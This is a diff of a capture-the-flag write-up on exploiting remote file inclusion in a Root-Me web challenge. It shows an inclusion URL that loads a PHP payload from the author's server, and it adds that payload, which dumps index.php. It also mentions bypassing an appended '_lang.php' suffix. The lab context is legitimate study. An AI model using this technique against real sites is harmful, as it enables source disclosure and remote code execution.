@@ -60,12 +60,16 @@ http://challenge01.root-me.org/web-serveur/ch13/?lang=https://h4ckrati.github.io
 
 where https://h4ckrati.github.io/rfi-test/exploit is the URL of my web server and the _myexploit.php_ is the payload which contains that :
 
+```
+<?php
+// We try to read the index.php file
+echo "--- Content ---<br><pre>";
+echo htmlspecialchars(file_get_contents('index.php'));
+echo "</pre>";
+?>
+```
 
-
-Now talking about the payload, our goal is to get the PHP source code. This can be done in at least 2 ways:
-
-1. We use the “[system](https://www.php.net/manual/en/function.system.php)” function in PHP to execute shell commands like “cat index.php” to show the content of the index.php.
-2. We can also use the PHP built-in function like the “[highlight_file](https://www.php.net/manual/en/function.highlight-file.php)” function or the “[show_source](https://www.php.net/manual/en/function.show-source.php)” function.
+#### 
 
 Another thing to be considered, we know that the include function has a trailing string, the “_lang.php”. This also must be bypassed otherwise we can not load the correct file. There are 2 ways that I know to bypass it:
 
